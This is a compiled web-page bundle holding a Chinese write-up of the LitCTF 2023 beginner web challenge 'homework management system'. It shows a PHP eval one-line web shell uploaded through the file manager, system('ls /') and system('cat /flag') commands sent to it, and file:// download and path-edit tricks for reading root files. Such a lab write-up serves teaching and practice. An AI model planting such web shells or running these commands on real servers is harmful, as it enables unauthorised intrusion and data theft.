(window.webpackJsonp=window.webpackJsonp||[]).push([[135],{660:function(a,t,s){"use strict";s.r(t);var e=s(2),r=Object(e.a)({},(function(){var a=this,t=a._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[t("Boxx"),a._v(" "),t("p",[a._v("[LitCTF 2023]这套题是Web方向入门题单，这是我的第17题")]),a._v(" "),t("p"),t("div",{staticClass:"table-of-contents"},[t("ul",[t("li",[t("a",{attrs:{href:"#题目描述-交作业-但是哪里不对"}},[a._v("题目描述：交作业！！但是哪里不对？")])]),t("li",[t("a",{attrs:{href:"#考点1-文件上传"}},[a._v("考点1：文件上传")])]),t("li",[t("a",{attrs:{href:"#解法1-文件上传"}},[a._v("解法1：文件上传")])]),t("li",[t("a",{attrs:{href:"#解法2-远程下载"}},[a._v("解法2：远程下载")])]),t("li",[t("a",{attrs:{href:"#解法3-直接编辑读取"}},[a._v("解法3：直接编辑读取")])]),t("li",[t("a",{attrs:{href:"#彩蛋"}},[a._v("彩蛋：")])]),t("li",[t("a",{attrs:{href:"#注"}},[a._v("注：")])])])]),t("p"),a._v(" "),t("ul",[t("li",[a._v("题单【"),t("a",{attrs:{href:"https://www.nssctf.cn/problem/3861",target:"_blank",rel:"noopener noreferrer"}},[a._v("传送门"),t("OutboundLink")],1),a._v("】")]),a._v(" "),t("li",[a._v("主办方WriteUP【"),t("a",{attrs:{href:"https://dqgom7v7dl.feishu.cn/docx/WdHvd735koqwJxxulA2cv4K4nKf",target:"_blank",rel:"noopener noreferrer"}},[a._v("传送门"),t("OutboundLink")],1),a._v("】")]),a._v(" "),t("li",[a._v("主办方WriteUP视频【"),t("a",{attrs:{href:"https://www.bilibili.com/video/BV1sm4y187EK",target:"_blank",rel:"noopener noreferrer"}},[a._v("传送门"),t("OutboundLink")],1),a._v("】")])]),a._v(" "),t("table",[t("thead",[t("tr",[t("th",[a._v("题目编号")]),a._v(" "),t("th",[a._v("题目名称")]),a._v(" "),t("th",[a._v("题目方向")]),a._v(" "),t("th",[a._v("难度")])])]),a._v(" "),t("tbody",[t("tr",[t("td",[a._v("3867")]),a._v(" "),t("td",[a._v("作业管理系统")]),a._v(" "),t("td",[a._v("Web")]),a._v(" "),t("td",[a._v("1")])])])]),a._v(" "),t("h1",{attrs:{id:"题目17-作业管理系统"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#题目17-作业管理系统"}},[a._v("#")]),a._v(" 题目17： 作业管理系统")]),a._v(" "),t("h3",{attrs:{id:"题目描述-交作业-但是哪里不对"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#题目描述-交作业-但是哪里不对"}},[a._v("#")]),a._v(" 题目描述：交作业！！但是哪里不对？")]),a._v(" "),t("h3",{attrs:{id:"考点1-文件上传"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#考点1-文件上传"}},[a._v("#")]),a._v(" 考点1：文件上传")]),a._v(" "),t("p",[a._v("首先，我们在做Web题的时候，要记得先审查元素看一下源代码，说不定会有惊喜呢？这里提示我们用户名和密码都是admin")]),a._v(" "),t("p",[t("img",{attrs:{src:"/img/essay/image-20241125202037150.png",alt:"image-20241125202037150"}})]),a._v(" "),t("h3",{attrs:{id:"解法1-文件上传"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#解法1-文件上传"}},[a._v("#")]),a._v(" 解法1：文件上传")]),a._v(" "),t("p",[a._v("进入页面后可以看到很显眼的“文件上传”选项，我们直接点击上传文件")]),a._v(" "),t("p",[t("img",{attrs:{src:"/img/essay/image-20241125202224025.png",alt:"image-20241125202224025"}})]),a._v(" "),t("p",[a._v("我们编写一个简单的php木马上传到服务器中。")]),a._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[t("span",{pre:!0,attrs:{class:"token php language-php"}},[t("span",{pre:!0,attrs:{class:"token delimiter important"}},[a._v("<?php")]),a._v(" @"),t("span",{pre:!0,attrs:{class:"token keyword"}},[a._v("eval")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),t("span",{pre:!0,attrs:{class:"token variable"}},[a._v("$_POST")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),t("span",{pre:!0,attrs:{class:"token number"}},[a._v("1")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(";")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token delimiter important"}},[a._v("?>")])]),a._v("\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("p",[t("img",{attrs:{src:"/img/essay/image-20241125202749149.png",alt:"image-20241125202749149"}})]),a._v(" "),t("p",[a._v("我们点击上传以后，返回主页，看到目录上方的统计数量变成了“1 个文件夹 2 个文件”，我们知道是我们上传成功了。我们已经可以在浏览器去访问1.php的文件了。")]),a._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[a._v("http://node4.anna.nssctf.cn:28599/1.php\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("p",[a._v("我们进入页面后，打开F12开发者工具，选择HackBar工具，发送一个POST请求，内容为")]),a._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[a._v("# 1是我们在木马里起的名字")]),a._v("\n"),t("span",{pre:!0,attrs:{class:"token number"}},[a._v("1")]),t("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),t("span",{pre:!0,attrs:{class:"token function"}},[a._v("system")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),t("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[a._v('"ls /"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(";")]),a._v("\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br")])]),t("p",[t("img",{attrs:{src:"/img/essay/image-20241125204853534.png",alt:"image-20241125204853534"}})]),a._v(" "),t("p",[a._v("通过上边的方式，我们可以直接在运行system语句来执行服务器命令，这样，我们就可以直接用cat来展示flag了")]),a._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[a._v('1=system("cat /flag");\n')])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("p",[t("img",{attrs:{src:"/img/essay/image-20241125205641965.png",alt:"image-20241125205641965"}})]),a._v(" "),t("h3",{attrs:{id:"解法2-远程下载"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#解法2-远程下载"}},[a._v("#")]),a._v(" 解法2：远程下载")]),a._v(" "),t("p",[a._v("我们在打开页面后，除了有上传文件，还有一个下载文件的地方。此题目如果上传有限制的话，就可以使用这个下载的功能，用远程下载去下载木马，然后编辑保存即可。")]),a._v(" "),t("p",[t("img",{attrs:{src:"/img/essay/image-20241125202224025.png",alt:"image-20241125202224025"}})]),a._v(" "),t("p",[a._v("**重点：**基于file协议，将根目录文件直接下载到当前目录")]),a._v(" "),t("p",[a._v("**注：**页面访问的是当前目录，也就是\t./\t这个目录，而flag是在\t/\t根目录下")]),a._v(" "),t("p",[t("img",{attrs:{src:"/img/essay/image-20241125210738158.png",alt:"image-20241125210738158"}})]),a._v(" "),t("p",[a._v("点击下载后，我们选择编辑文件，即可查看该flag。")]),a._v(" "),t("p",[t("img",{attrs:{src:"/img/essay/image-20241125210826322.png",alt:"image-20241125210826322"}})]),a._v(" "),t("p",[a._v("也可以在链接后直接加个flag，通过地址栏的方式直接下载flag的文件。")]),a._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[a._v("http://node4.anna.nssctf.cn:28599/flag\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("p",[a._v("下载到本地后打开即可看到flag")]),a._v(" "),t("h3",{attrs:{id:"解法3-直接编辑读取"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#解法3-直接编辑读取"}},[a._v("#")]),a._v(" 解法3：直接编辑读取")]),a._v(" "),t("p",[a._v("如果没有使用\t"),t("strong",[a._v("file:///")]),a._v("\t这个协议，我们可以在下载文件并编辑的时候，直接修改地址栏的内容")]),a._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[a._v("http://node4.anna.nssctf.cn:28599/index.php?op=edit&fename=flag&folder=/\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("p",[a._v("通过这段地址，我们就可以直接编辑根目录下的flag文件，也就可以直观的展示到页面中了。")]),a._v(" "),t("h3",{attrs:{id:"彩蛋"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#彩蛋"}},[a._v("#")]),a._v(" 彩蛋：")]),a._v(" "),t("p",[a._v("在远程下载中，提供了一个预输入，访问该地址，即可得到彩蛋。")]),a._v(" "),t("p",[t("img",{attrs:{src:"/img/essay/d88d6fca-efe5-4034-ba9e-0c677ad9f5e4.png",alt:"d88d6fca-efe5-4034-ba9e-0c677ad9f5e4"}})]),a._v(" "),t("p",[a._v("该地址是一个github地址，我们访问这个地址")]),a._v(" "),t("p",[t("img",{attrs:{src:"/img/essay/f11f99a0-69ed-4aae-9c63-29bd4446c508.png",alt:"f11f99a0-69ed-4aae-9c63-29bd4446c508"}})]),a._v(" "),t("h3",{attrs:{id:"注"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#注"}},[a._v("#")]),a._v(" 注：")]),a._v(" "),t("p",[a._v("在做这道题的时候，没注意到时间限制，结果到时间了，大家一定要注意时间呀")])],1)}),[],!1,null,null,null);t.default=r.exports}}]);